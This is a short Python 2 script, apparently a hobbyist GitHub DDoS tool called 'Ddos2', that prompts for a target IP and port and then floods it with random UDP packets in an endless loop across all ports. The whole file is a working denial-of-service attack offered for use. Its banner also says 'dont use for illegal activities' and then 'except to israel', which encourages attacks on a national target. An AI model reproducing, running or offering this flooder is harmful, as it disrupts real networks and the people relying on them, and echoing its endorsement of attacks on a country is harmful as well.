#lang=python

import sys
import socket
import time
import random
import os
from datetime import datetime

#time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

#terminal clear all session
os.system("clear")

#terminal display DDOS 2 as figlet
os.system("toilet -F border --metal -f mono12 Ddos2")

#display text use echo (print)? Hehe
os.system("echo 'dont use for illegal activities'")
time.sleep(1)

os.system("echo 'except to israel'")
time.sleep(2)
#Banner
banner="""
|------------------------------------|
 +Author : Mika259(M1K259)+
 +Github : https://github.com/Mika259+
 +Version : 0.1+
|------------------------------------|
"""
#display banner

GREEN   = '\033[32m'
CYAN    = '\033[36m'

print(GREEN+ banner)

ip = raw_input("[+]Enter Ip : ")
port = input("[+]Insert Port : ")

#Run for Terminal
os.system("clear")

time.sleep(0.5)
print("Attack Starting")
time.sleep(1)
os.system("clear")
time.sleep(1)
print("Wait a seccond")
time.sleep(0.5)

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[36m sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
#Maaf jika ada Kesalahan , tolong tegur :)
#sorry for mistakes , please teach us
